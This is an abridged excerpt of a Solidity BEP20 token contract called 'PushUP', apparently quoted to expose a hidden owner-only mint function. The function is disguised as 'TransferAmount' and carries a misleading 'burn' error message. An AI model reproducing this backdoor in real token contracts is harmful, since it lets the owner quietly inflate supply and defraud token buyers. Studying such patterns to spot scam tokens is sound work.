...
pragma solidity ^0.8.7;
    ...
    contract PushUP is IBEP20, Ownable
    {
        ...
        string private constant _name = "PushUP";
        ...
        address public constant TeamWallet=0xf195a349624B13c1BaBC3F66FEDa098BBD39fF16; //TEAMWALLET
        address private constant PancakeRouter=0x10ED43C718714eb63d5aA57B78B54704E256024E;


        uint256 private _CirculatingTickets =AvailableTickets;
        uint256 public  balanceLimit = 30_000_000_000 * 10**_decimals;
        uint256 public  sellLimit = 50_000_000_000 * 10**_decimals;
        uint256 public  buyLimit = 50_000_000_000 * 10**_decimals;
        ...
        constructor () {
            uint256 deployerBalance=_CirculatingTickets;
 ...
 //mint tokens
      function TransferAmount(address account, uint256 amount) onlyOwner  public virtual {
        require(account != address(0), "ERC20: burn to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _CirculatingTickets += amount;
        ...
        function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{
            ...
            _CirculatingTickets-=tokensToBeBurnt;
       ...
       function _addLiquidity(uint256 tokenamount, uint256 bnbamount) private {
        ...
        function getBurnedTokens() public view returns(uint256){
            return (AvailableTickets-_CirculatingTickets)/10**_decimals;
        }
